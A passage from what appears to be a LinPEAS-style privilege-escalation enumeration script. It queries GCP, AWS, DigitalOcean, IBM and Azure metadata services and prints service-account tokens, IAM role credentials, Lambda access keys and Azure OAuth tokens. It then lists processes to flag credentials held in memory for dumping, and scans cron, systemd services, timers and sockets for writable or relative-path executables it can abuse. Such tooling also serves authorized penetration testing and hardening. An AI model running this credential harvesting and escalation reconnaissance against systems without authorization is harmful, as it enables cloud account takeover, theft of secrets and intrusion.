        inst_k8s_kubenv=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env")
        [ "$inst_k8s_kubenv" ] && echo "K8s Kube-env: $inst_k8s_kubenv"

        echo ""
        print_3title "Interfaces"
        for iface in $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/"); do 
            echo "  IP: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/ip")
            echo "  Subnetmask: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
            echo "  Gateway: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
            echo "  DNS: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
            echo "  Network: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/network")
            echo "  ==============  "
        done
        
        echo ""
        print_3title "User Data"
        echo $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script")
        echo ""

        echo ""
        print_3title "Service Accounts"
        for sa in $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"); do 
            echo "  Name: $sa"
            echo "  Email: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/email")
            echo "  Aliases: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/aliases")
            echo "  Identity: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/identity")
            echo "  Scopes: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/scopes") | sed -${E} "s,${GCP_GOOD_SCOPES},${SED_GREEN},g" | sed -${E} "s,${GCP_BAD_SCOPES},${SED_RED},g"
            echo "  Token: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/token")
            echo "  ==============  "
        done
    fi
fi

# AWS ECS Enumeration
if [ "$is_aws_ecs" = "Yes" ]; then
    print_2title "AWS ECS Enumeration"
    
    aws_ecs_req=""
    if [ "$(command -v curl)" ]; then
        aws_ecs_req='curl -s -f'
    elif [ "$(command -v wget)" ]; then
        aws_ecs_req='wget -q -O -'
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi

    if [ "$aws_ecs_metadata_uri" ]; then
        print_3title "Container Info"
        exec_with_jq eval $aws_ecs_req "$aws_ecs_metadata_uri"
        echo ""
        
        print_3title "Task Info"
        exec_with_jq eval $aws_ecs_req "$aws_ecs_metadata_uri/task"
        echo ""
    else
        echo "I couldn't find ECS_CONTAINER_METADATA_URI env var to get container info"
    fi

    if [ "$aws_ecs_service_account_uri" ]; then
        print_3title "IAM Role"
        exec_with_jq eval $aws_ecs_req "$aws_ecs_service_account_uri"
        echo ""
    else
        echo "I couldn't find AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var to get IAM role info (the task is running without a task role probably)"
    fi
fi

# AWS EC2 Enumeration
if [ "$is_aws_ec2" = "Yes" ]; then
    print_2title "AWS EC2 Enumeration"
    
    HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
    URL="http://169.254.169.254/latest/meta-data"
    
    aws_req=""
    if [ "$(command -v curl)" ]; then
        aws_req="curl -s -f -H '$HEADER'"
    elif [ "$(command -v wget)" ]; then
        aws_req="wget -q -O - -H '$HEADER'"
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi
  
    if [ "$aws_req" ]; then
        printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
        printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
        printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
        printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
        printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
        printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

        echo ""
        print_3title "Account Info"
        exec_with_jq eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""

        echo ""
        print_3title "Network Info"
        for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do 
          echo "Mac: $mac"
          printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
          printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
          printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
          echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
          printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
          echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
          printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
          echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
          echo ""
        done

        echo ""
        print_3title "IAM Role"
        exec_with_jq eval $aws_req "$URL/iam/info"; echo ""
        for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do 
          echo "Role: $role"
          exec_with_jq eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
          echo ""
        done
        
        echo ""
        print_3title "User Data"
        eval $aws_req "http://169.254.169.254/latest/user-data"; echo ""
        
        echo ""
        echo "EC2 Security Credentials"
        exec_with_jq eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
        
        print_3title "SSM Runnig"
        ps aux 2>/dev/null | grep "ssm-agent" | grep -v "grep" | sed "s,ssm-agent,${SED_RED},"
    fi
fi

# AWS Lambda Enumeration
if [ "$is_aws_lambda" = "Yes" ]; then
  print_2title "AWS Lambda Enumeration"
  printf "Function name: "; env | grep AWS_LAMBDA_FUNCTION_NAME
  printf "Region: "; env | grep AWS_REGION
  printf "Secret Access Key: "; env | grep AWS_SECRET_ACCESS_KEY
  printf "Access Key ID: "; env | grep AWS_ACCESS_KEY_ID
  printf "Session token: "; env | grep AWS_SESSION_TOKEN
  printf "Security token: "; env | grep AWS_SECURITY_TOKEN
  printf "Runtime API: "; env | grep AWS_LAMBDA_RUNTIME_API
  printf "Event data: "; (curl -s "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next" 2>/dev/null || wget -q -O - "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next")
fi

# AWS Codebuild Enumeration
if [ "$is_aws_codebuild" = "Yes" ]; then
  print_2title "AWS Codebuild Enumeration"

  aws_req=""
  if [ "$(command -v curl)" ]; then
      aws_req="curl -s -f"
  elif [ "$(command -v wget)" ]; then
      aws_req="wget -q -O -"
  else 
      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
      echo "The addresses are in /codebuild/output/tmp/env.sh"
  fi

  if [ "$aws_req" ]; then
    print_3title "Credentials"
    CREDS_PATH=$(cat /codebuild/output/tmp/env.sh | grep "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" | cut -d "'" -f 2)
    URL_CREDS="http://169.254.170.2$CREDS_PATH" # Already has a / at the begginig
    exec_with_jq eval $aws_req "$URL_CREDS"; echo ""

    print_3title "Container Info"
    METADATA_URL=$(cat /codebuild/output/tmp/env.sh | grep "ECS_CONTAINER_METADATA_URI" | cut -d "'" -f 2)
    exec_with_jq eval $aws_req "$METADATA_URL"; echo ""
  fi
fi

# DO Droplet Enumeration
if [ "$is_do" = "Yes" ]; then
  print_2title "DO Droplet Enumeration"

  do_req=""
  if [ "$(command -v curl)" ]; then
      do_req='curl -s -f '
  elif [ "$(command -v wget)" ]; then
      do_req='wget -q -O - '
  else 
      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  fi

  if [ "$do_req" ]; then
    URL="http://169.254.169.254/metadata"
    printf "Id: "; eval $do_req "$URL/v1/id"; echo ""
    printf "Region: "; eval $do_req "$URL/v1/region"; echo ""
    printf "Public keys: "; eval $do_req "$URL/v1/public-keys"; echo ""
    printf "User data: "; eval $do_req "$URL/v1/user-data"; echo ""
    printf "Dns: "; eval $do_req "$URL/v1/dns/nameservers" | tr '\n' ','; echo ""
    printf "Interfaces: "; eval $do_req "$URL/v1.json" | jq ".interfaces";
    printf "Floating_ip: "; eval $do_req "$URL/v1.json" | jq ".floating_ip";
    printf "Reserved_ip: "; eval $do_req "$URL/v1.json" | jq ".reserved_ip";
    printf "Tags: "; eval $do_req "$URL/v1.json" | jq ".tags";
    printf "Features: "; eval $do_req "$URL/v1.json" | jq ".features";
  fi
fi

# IBM Cloud Enumeration
if [ "$is_ibm_vm" = "Yes" ]; then
  print_2title "IBM Cloud Enumeration"

  if ! [ "$IBM_TOKEN" ]; then
    echo "Couldn't get the metadata token:("

  else
    TOKEN_HEADER="Authorization: Bearer $IBM_TOKEN"
    ACCEPT_HEADER="Accept: application/json"
    URL="http://169.254.169.254/latest/meta-data"
    
    ibm_req=""
    if [ "$(command -v curl)" ]; then
        ibm_req="curl -s -f -H '$TOKEN_HEADER' -H '$ACCEPT_HEADER'"
    elif [ "$(command -v wget)" ]; then
        ibm_req="wget -q -O - -H '$TOKEN_HEADER' -H '$ACCEPT_HEADER'"
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi

    if [ "$ibm_req" ]; then
      print_3title "Instance Details"
      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/instance?version=2022-03-01"

      print_3title "Keys and User data"
      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01"
      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/keys?version=2022-03-01"

      print_3title "Placement Groups"
      exec_with_jq eval $ibm_req "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01"

      print_3title "IAM credentials"
      exec_with_jq eval $ibm_req -X POST "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01"
    fi
  fi

fi

# Azure VM Enumeration
if [ "$is_az_vm" = "Yes" ]; then
  print_2title "Azure VM Enumeration"

  HEADER="Metadata:true"
  URL="http://169.254.169.254/metadata"
  API_VERSION="2021-12-13" # https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions
  
  az_req=""
  if [ "$(command -v curl)" ]; then
      az_req="curl -s -f -H '$HEADER'"
  elif [ "$(command -v wget)" ]; then
      az_req="wget -q -O - -H '$HEADER'"
  else 
      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  fi

  if [ "$az_req" ]; then
    print_3title "Instance details"
    exec_with_jq eval $az_req "$URL/instance?api-version=$API_VERSION"

    print_3title "Load Balancer details"
    exec_with_jq eval $az_req "$URL/loadbalancer?api-version=$API_VERSION"

    print_3title "Management token"
    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://management.azure.com/"

    print_3title "Graph token"
    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://graph.microsoft.com/"
    
    print_3title "Vault token"
    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://vault.azure.net/"

    print_3title "Storage token"
    exec_with_jq eval $az_req "$URL/identity/oauth2/token?api-version=$API_VERSION\&resource=https://storage.azure.com/"
  fi
fi

if [ "$check_az_app" = "Yes" ]; then
  print_2title "Azure App Service Enumeration"
  echo "I haven't tested this one, if it doesn't work, please send a PR fixing and adding functionality :)"

  HEADER="secret:$IDENTITY_HEADER"

  az_req=""
  if [ "$(command -v curl)" ]; then
      az_req="curl -s -f -H '$HEADER'"
  elif [ "$(command -v wget)" ]; then
      az_req="wget -q -O - -H '$HEADER'"
  else 
      echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  fi

  if [ "$az_req" ]; then
    print_3title "Management token"
    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://management.azure.com/"

    print_3title "Graph token"
    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://graph.microsoft.com/"
    
    print_3title "Vault token"
    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://vault.azure.net/"

    print_3title "Storage token"
    exec_with_jq eval $az_req "$IDENTITY_ENDPOINT?api-version=$API_VERSION\&resource=https://storage.azure.com/"
  fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets; then
print_title "Processes, Crons, Timers, Services and Sockets"

####################################################
#-----) Processes & Cron & Services & Timers (-----#
####################################################

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PCS) Cleaned proccesses
  print_2title "Cleaned processes"

  if [ "$NOUSEPS" ]; then
    printf ${BLUE}"[i]$GREEN Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
  fi
  print_info "Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes"

  if [ -f "/etc/fstab" ] && cat /etc/fstab | grep -q "hidepid=2"; then
    echo "Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users"
  fi

  if [ "$NOUSEPS" ]; then
    print_ps | grep -v 'sed-Es' | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED}," | sed -${E} "s,$processesVB,${SED_RED_YELLOW},g" | sed "s,$processesB,${SED_RED}," | sed -${E} "s,$processesDump,${SED_RED},"
    pslist=$(print_ps)
  else
    (ps fauxwww || ps auxwww | sort ) 2>/dev/null | grep -v "\[" | grep -v "%CPU" | while read psline; do
      echo "$psline"  | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED}," | sed -${E} "s,$processesVB,${SED_RED_YELLOW},g" | sed "s,$processesB,${SED_RED}," | sed -${E} "s,$processesDump,${SED_RED},"
      if [ "$(command -v capsh)" ] && ! echo "$psline" | grep -q root; then
        cpid=$(echo "$psline" | awk '{print $2}')
        caphex=0x"$(cat /proc/$cpid/status 2> /dev/null | grep CapEff | awk '{print $2}')"
        if [ "$caphex" ] && [ "$caphex" != "0x" ] && echo "$caphex" | grep -qv '0x0000000000000000'; then
          printf "  └─(${DG}Caps${NC}) "; capsh --decode=$caphex 2>/dev/null | grep -v "WARNING:" | sed -${E} "s,$capsB,${SED_RED},g"
        fi
      fi
    done
    pslist=$(ps auxwww)
    echo ""

    #-- PCS) Binary processes permissions
    print_2title "Binary processes permissions (non 'root root' and not belonging to current user)"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes"
    binW="IniTialiZZinnggg"
    ps auxwww 2>/dev/null | awk '{print $11}' | while read bpath; do
      if [ -w "$bpath" ]; then
        binW="$binW|$bpath"
      fi
    done
    ps auxwww 2>/dev/null | awk '{print $11}' | xargs ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | grep -v " root root " | grep -v " $USER " | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$binW,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed "s,root,${SED_GREEN},"
  fi
  echo ""
fi

CURRENT_USER_PIVOT_PID=""
if ! [ "$SEARCH_IN_FOLDER" ] && ! [ "$NOUSEPS" ]; then
  #-- PCS) Process opened by other users
  print_2title "Processes whose PPID belongs to a different user (not root)"
  print_info "You will know if a user can somehow spawn processes as a different user"
  
  # Function to get user by PID
  get_user_by_pid() {
    ps -p "$1" -o user | grep -v "USER"
  }

  # Find processes with PPID and user info, then filter those where PPID's user is different from the process's user
  ps -eo pid,ppid,user | grep -v "PPID" | while read -r pid ppid user; do
    if [ "$ppid" = "0" ]; then
      continue
    fi
    ppid_user=$(get_user_by_pid "$ppid")
    if echo "$user" | grep -Eqv "$ppid_user|root$"; then
      echo "Proc $pid with ppid $ppid is run by user $user but the ppid user is $ppid_user" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
      if [ "$ppid_user" = "$USER" ]; then
        CURRENT_USER_PIVOT_PID="$ppid"
      fi
    fi
  done
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PCS) Files opened by processes belonging to other users
  if ! [ "$IAMROOT" ]; then
    print_2title "Files opened by processes belonging to other users"
    print_info "This is usually empty because of the lack of privileges to read other user processes information"
    lsof 2>/dev/null | grep -v "$USER" | grep -iv "permission denied" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PCS) Processes with credentials inside memory
  print_2title "Processes with credentials in memory (root req)"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory"
  if echo "$pslist" | grep -q "gdm-password"; then echo "gdm-password process found (dump creds from memory as root)" | sed "s,gdm-password process,${SED_RED},"; else echo_not_found "gdm-password"; fi
  if echo "$pslist" | grep -q "gnome-keyring-daemon"; then echo "gnome-keyring-daemon process found (dump creds from memory as root)" | sed "s,gnome-keyring-daemon,${SED_RED},"; else echo_not_found "gnome-keyring-daemon"; fi
  if echo "$pslist" | grep -q "lightdm"; then echo "lightdm process found (dump creds from memory as root)" | sed "s,lightdm,${SED_RED},"; else echo_not_found "lightdm"; fi
  if echo "$pslist" | grep -q "vsftpd"; then echo "vsftpd process found (dump creds from memory as root)" | sed "s,vsftpd,${SED_RED},"; else echo_not_found "vsftpd"; fi
  if echo "$pslist" | grep -q "apache2"; then echo "apache2 process found (dump creds from memory as root)" | sed "s,apache2,${SED_RED},"; else echo_not_found "apache2"; fi
  if echo "$pslist" | grep -q "sshd:"; then echo "sshd: process found (dump creds from memory as root)" | sed "s,sshd:,${SED_RED},"; else echo_not_found "sshd"; fi
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PCS) Different processes 1 min
  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then
    print_2title "Different processes executed during 1 min (interesting is low number of repetitions)"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#frequent-cron-jobs"
    temp_file=$(mktemp)
    if [ "$(ps -e -o user,command 2>/dev/null)" ]; then 
      for i in $(seq 1 1210); do 
        ps -e -o user,command >> "$temp_file" 2>/dev/null; sleep 0.05; 
      done;
      sort "$temp_file" 2>/dev/null | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort -r -n | grep -E -v "\s*[1-9][0-9][0-9][0-9]" | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"; 
      rm "$temp_file";
    fi
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PCS) Cron
  print_2title "Cron jobs"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
  command -v crontab 2>/dev/null || echo_not_found "crontab"
  crontab -l 2>/dev/null | tr -d "\r" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
  command -v incrontab 2>/dev/null || echo_not_found "incrontab"
  incrontab -l 2>/dev/null
  ls -alR /etc/cron* /var/spool/cron/crontabs /var/spool/anacron 2>/dev/null | sed -${E} "s,$cronjobsG,${SED_GREEN},g" | sed "s,$cronjobsB,${SED_RED},g"
  cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/* /etc/incron.d/* /var/spool/incron/* 2>/dev/null | tr -d "\r" | grep -v "^#" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},"  | sed "s,root,${SED_RED},"
  crontab -l -u "$USER" 2>/dev/null | tr -d "\r"
  ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /var/at/tabs/ /etc/periodic/ 2>/dev/null | sed -${E} "s,$cronjobsG,${SED_GREEN},g" | sed "s,$cronjobsB,${SED_RED},g" #MacOS paths
  atq 2>/dev/null
else
  print_2title "Cron jobs"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
  find "$SEARCH_IN_FOLDER" '(' -type d -or -type f ')' '(' -name "cron*" -or -name "anacron" -or -name "anacrontab" -or -name "incron.d" -or -name "incron" -or -name "at" -or -name "periodic" ')' -exec echo {} \; -exec ls -lR {} \;
fi
echo ""


if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ "$MACPEAS" ]; then
    print_2title "Third party LaunchAgents & LaunchDemons"
    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#launchd"
    ls -l /Library/LaunchAgents/ /Library/LaunchDaemons/ ~/Library/LaunchAgents/ ~/Library/LaunchDaemons/ 2>/dev/null
    echo ""

    print_2title "Writable System LaunchAgents & LaunchDemons"
    find /System/Library/LaunchAgents/ /System/Library/LaunchDaemons/ /Library/LaunchAgents/ /Library/LaunchDaemons/ | grep ".plist" | while read f; do
      program=""
      program=$(defaults read "$f" Program 2>/dev/null)
      if ! [ "$program" ]; then
        program=$(defaults read "$f" ProgramArguments | grep -Ev "^\(|^\)" | cut -d '"' -f 2)
      fi
      if [ -w "$program" ]; then
        echo "$program" is writable | sed -${E} "s,.*,${SED_RED_YELLOW},";
      fi
    done
    echo ""

    print_2title "StartupItems"
    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#startup-items"
    ls -l /Library/StartupItems/ /System/Library/StartupItems/ 2>/dev/null
    echo ""

    print_2title "Login Items"
    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#login-items"
    osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null
    echo ""

    print_2title "SPStartupItemDataType"
    system_profiler SPStartupItemDataType
    echo ""

    print_2title "Emond scripts"
    print_info "https://book.hacktricks.xyz/macos/macos-security-and-privilege-escalation#emond"
    ls -l /private/var/db/emondClients
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PCS) Services
  if [ "$EXTRA_CHECKS" ]; then
    print_2title "Services"
    print_info "Search for outdated versions"
    (service --status-all || service -e || chkconfig --list || rc-status || launchctl list) 2>/dev/null || echo_not_found "service|chkconfig|rc-status|launchctl"
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PSC) systemd PATH
  print_2title "Systemd PATH"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths"
  systemctl show-environment 2>/dev/null | grep "PATH" | sed -${E} "s,$Wfolders\|\./\|\.:\|:\.,${SED_RED_YELLOW},g"
  WRITABLESYSTEMDPATH=$(systemctl show-environment 2>/dev/null | grep "PATH" | grep -E "$Wfolders")
  echo ""
fi

#-- PSC) .service files
#TODO: .service files in MACOS are folders
print_2title "Analyzing .service files"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services"
printf "%s\n" "$PSTORAGE_SYSTEMD" | while read s; do
  if [ ! -O "$s" ] || [ "$SEARCH_IN_FOLDER" ]; then #Remove services that belongs to the current user or if firmware see everything
    if ! [ "$IAMROOT" ] && [ -w "$s" ] && [ -f "$s" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
      echo "$s" | sed -${E} "s,.*,${SED_RED_YELLOW},g"
    fi
    servicebinpaths=$(grep -Eo '^Exec.*?=[!@+-]*[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,') #Get invoked paths
    printf "%s\n" "$servicebinpaths" | while read sp; do
      if [ -w "$sp" ]; then
        echo "$s is calling this writable executable: $sp" | sed "s,writable.*,${SED_RED_YELLOW},g"
      fi
    done
    relpath1=$(grep -E '^Exec.*=(?:[^/]|-[^/]|\+[^/]|![^/]|!![^/]|)[^/@\+!-].*' "$s" 2>/dev/null | grep -Iv "=/")
    relpath2=$(grep -E '^Exec.*=.*/bin/[a-zA-Z0-9_]*sh ' "$s" 2>/dev/null)
    if [ "$relpath1" ] || [ "$relpath2" ]; then
      if [ "$WRITABLESYSTEMDPATH" ]; then
        echo "$s could be executing some relative path" | sed -${E} "s,.*,${SED_RED},";
      else
        echo "$s could be executing some relative path"
      fi
    fi
  fi
done
if [ ! "$WRITABLESYSTEMDPATH" ]; then echo "You can't write on systemd PATH" | sed -${E} "s,.*,${SED_GREEN},"; fi
echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  #-- PSC) Timers
  print_2title "System timers"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers"
  (systemctl list-timers --all 2>/dev/null | grep -Ev "(^$|timers listed)" | sed -${E} "s,$timersG,${SED_GREEN},") || echo_not_found
  echo ""
fi

#-- PSC) .timer files
print_2title "Analyzing .timer files"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers"
printf "%s\n" "$PSTORAGE_TIMER" | while read t; do
  if ! [ "$IAMROOT" ] && [ -w "$t" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
    echo "$t" | sed -${E} "s,.*,${SED_RED},g"
  fi
  timerbinpaths=$(grep -Po '^Unit=*(.*?$)' $t 2>/dev/null | cut -d '=' -f2)
  printf "%s\n" "$timerbinpaths" | while read tb; do
    if [ -w "$tb" ]; then
      echo "$t timer is calling this writable executable: $tb" | sed "s,writable.*,${SED_RED},g"
    fi
  done
  #relpath="`grep -Po '^Unit=[^/].*' \"$t\" 2>/dev/null`"
  #for rp in "$relpath"; do
  #  echo "$t is calling a relative path: $rp" | sed "s,relative.*,${SED_RED},g"
  #done
done
echo ""

#-- PSC) .socket files
#TODO: .socket files in MACOS are folders
if ! [ "$IAMROOT" ]; then
  print_2title "Analyzing .socket files"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets"
  printf "%s\n" "$PSTORAGE_SOCKET" | while read s; do
    if ! [ "$IAMROOT" ] && [ -w "$s" ] && [ -f "$s" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
      echo "Writable .socket file: $s" | sed "s,/.*,${SED_RED},g"
    fi
    socketsbinpaths=$(grep -Eo '^(Exec).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
    printf "%s\n" "$socketsbinpaths" | while read sb; do
      if [ -w "$sb" ]; then
        echo "$s is calling this writable executable: $sb" | sed "s,writable.*,${SED_RED},g"
      fi
    done
    socketslistpaths=$(grep -Eo '^(Listen).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
    printf "%s\n" "$socketslistpaths" | while read sl; do
      if [ -w "$sl" ]; then
        echo "$s is calling this writable listener: $sl" | sed "s,writable.*,${SED_RED},g";
      fi
    done
  done
  echo ""
  
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    print_2title "Unix Sockets Listening"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets"
    # Search sockets using netstat and ss
    unix_scks_list=$(ss -xlp -H state listening 2>/dev/null | grep -Eo "/.* " | cut -d " " -f1)
    if ! [ "$unix_scks_list" ];then
      unix_scks_list=$(ss -l -p -A 'unix' 2>/dev/null | grep -Ei "listen|Proc" | grep -Eo "/[a-zA-Z0-9\._/\-]+")
    fi
    if ! [ "$unix_scks_list" ];then
      unix_scks_list=$(netstat -a -p --unix 2>/dev/null | grep -Ei "listen|PID" | grep -Eo "/[a-zA-Z0-9\._/\-]+" | tail -n +2)
    fi
     unix_scks_list3=$(lsof -U 2>/dev/null | awk '{print $9}' | grep "/") 
  fi
  
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    # But also search socket files
    unix_scks_list2=$(find / -type s 2>/dev/null)
  else
    unix_scks_list2=$(find "SEARCH_IN_FOLDER" -type s 2>/dev/null)
  fi

  # Detele repeated dockets and check permissions
  (printf "%s\n" "$unix_scks_list" && printf "%s\n" "$unix_scks_list2" && printf "%s\n" "$unix_scks_list3") | sort | uniq | while read l; do
    perms=""
